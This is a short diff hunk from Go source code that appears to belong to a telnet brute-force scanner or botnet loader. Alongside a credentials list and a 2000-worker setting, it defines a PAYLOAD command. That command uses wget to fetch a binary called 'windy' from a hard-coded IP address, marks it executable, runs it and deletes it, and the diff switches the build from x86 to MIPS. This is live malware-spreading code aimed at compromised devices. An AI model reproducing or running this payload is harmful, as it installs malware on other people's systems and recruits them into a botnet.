@@ -64,7 +64,7 @@ var CREDENTIALS = []struct {
 const (
 	TELNET_TIMEOUT    = 2 * time.Second
 	MAX_WORKERS       = 2000
-	PAYLOAD           = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://152.42.212.230/windy.x86; chmod +x windy.x86; ./windy.x86; rm -rf windy.x86"
+	PAYLOAD           = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://152.42.212.230/windy.mips; chmod +x windy.mips; ./windy.mips; rm -rf windy.mips"
 	STATS_INTERVAL    = 1 * time.Second
 	MAX_QUEUE_SIZE    = 100000
 	CONNECT_TIMEOUT   = 1 * time.Second
